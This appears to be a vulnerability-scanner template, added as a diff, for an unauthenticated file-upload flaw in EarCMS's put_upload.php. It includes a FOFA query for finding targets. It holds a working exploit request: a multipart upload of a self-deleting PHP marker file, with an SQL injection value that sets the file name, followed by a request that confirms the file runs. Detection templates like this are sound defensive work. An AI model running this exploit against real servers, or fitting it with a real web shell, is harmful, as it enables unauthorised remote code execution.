@@ -1,0 +1,47 @@
+id: earcms-put_upload-upload
+
+info:
+  name: EarCMS put_upload.php 文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="EearCMS"
+          EarCMS put_upload.php 接口未正确校验文件上传权限，攻击者可通过构造恶意请求上传Web Shell、恶意脚本等可执行文件，实现对目标服务器的远程控制、敏感数据窃取或系统服务破坏。该漏洞允许非授权用户绕过文件类型及路径限制，直接写入Web目录可执行文件。
+  tags: EarCMS
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /source/index/put_upload.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data;boundary=---------------------------51564987891651984798165156489
+
+    -----------------------------51564987891651984798165156489
+    Content-Disposition: form-data; name="ipa"; filename="NTest"
+    Content-Type: application/x-msdownload
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    -----------------------------51564987891651984798165156489
+    Content-Disposition: form-data; name="id"
+
+    -1  union SELECT "NTest.php";
+    -----------------------------51564987891651984798165156489
+    Content-Disposition: form-data; name="pw"
+
+    month-cf3b79c6e54ca7a8d50cdc8aedcde407
+    -----------------------------51564987891651984798165156489--
+- raw:
+  - |
+    GET /data/attachment/NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'NdayTest'
